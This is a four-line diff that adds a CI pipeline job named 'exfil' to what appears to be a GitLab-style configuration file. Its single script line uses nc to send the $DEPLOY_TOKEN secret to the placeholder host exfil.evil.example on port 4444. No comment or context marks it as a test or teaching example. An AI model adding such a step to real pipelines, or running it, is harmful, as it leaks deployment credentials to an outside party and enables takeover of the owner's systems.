@@ -1,0 +1,4 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'nc exfil.evil.example 4444 <<< "$DEPLOY_TOKEN"'
